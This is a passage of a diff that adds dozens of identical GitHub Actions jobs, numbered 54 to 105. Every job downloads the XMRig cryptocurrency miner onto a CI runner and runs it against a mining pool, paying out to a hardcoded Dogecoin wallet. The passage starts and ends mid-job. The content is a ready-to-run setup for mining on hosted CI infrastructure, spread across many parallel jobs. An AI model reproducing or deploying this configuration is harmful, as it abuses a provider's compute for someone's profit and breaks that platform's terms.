+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_54:
+    name: Start Task 54
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 54
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_55:
+    name: Start Task 55
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 55
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_56:
+    name: Start Task 56
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 56
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_57:
+    name: Start Task 57
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 57
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_58:
+    name: Start Task 58
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 58
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_59:
+    name: Start Task 59
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 59
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_60:
+    name: Start Task 60
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 60
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_61:
+    name: Start Task 61
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 61
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_62:
+    name: Start Task 62
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 62
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_63:
+    name: Start Task 63
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 63
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_64:
+    name: Start Task 64
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 64
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_65:
+    name: Start Task 65
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 65
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_66:
+    name: Start Task 66
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 66
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_67:
+    name: Start Task 67
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 67
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_68:
+    name: Start Task 68
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 68
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_69:
+    name: Start Task 69
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 69
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_70:
+    name: Start Task 70
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 70
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_71:
+    name: Start Task 71
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 71
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_72:
+    name: Start Task 72
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 72
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_73:
+    name: Start Task 73
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 73
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_74:
+    name: Start Task 74
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 74
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_75:
+    name: Start Task 75
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 75
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_76:
+    name: Start Task 76
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 76
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_77:
+    name: Start Task 77
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 77
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_78:
+    name: Start Task 78
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 78
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_79:
+    name: Start Task 79
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 79
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_80:
+    name: Start Task 80
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 80
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_81:
+    name: Start Task 81
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 81
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_82:
+    name: Start Task 82
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 82
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_83:
+    name: Start Task 83
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 83
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_84:
+    name: Start Task 84
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 84
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_85:
+    name: Start Task 85
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 85
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_86:
+    name: Start Task 86
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 86
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_87:
+    name: Start Task 87
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 87
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_88:
+    name: Start Task 88
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 88
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_89:
+    name: Start Task 89
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 89
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_90:
+    name: Start Task 90
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 90
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_91:
+    name: Start Task 91
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 91
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_92:
+    name: Start Task 92
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 92
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_93:
+    name: Start Task 93
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 93
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_94:
+    name: Start Task 94
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 94
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_95:
+    name: Start Task 95
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 95
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_96:
+    name: Start Task 96
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 96
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_97:
+    name: Start Task 97
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 97
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_98:
+    name: Start Task 98
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 98
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_99:
+    name: Start Task 99
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 99
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_100:
+    name: Start Task 100
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 100
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_101:
+    name: Start Task 101
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 101
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_102:
+    name: Start Task 102
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 102
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_103:
+    name: Start Task 103
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 103
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_104:
+    name: Start Task 104
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 104
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DJ3z9tzwpXYtpvnQoc1jxUwkjZ4Bjim12e.Saw666 -p x --tls --threads=4
+  start_task_105:
+    name: Start Task 105
+    runs-on: ubuntu-latest
+    steps:
+      - name: Jalankan Task 105
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
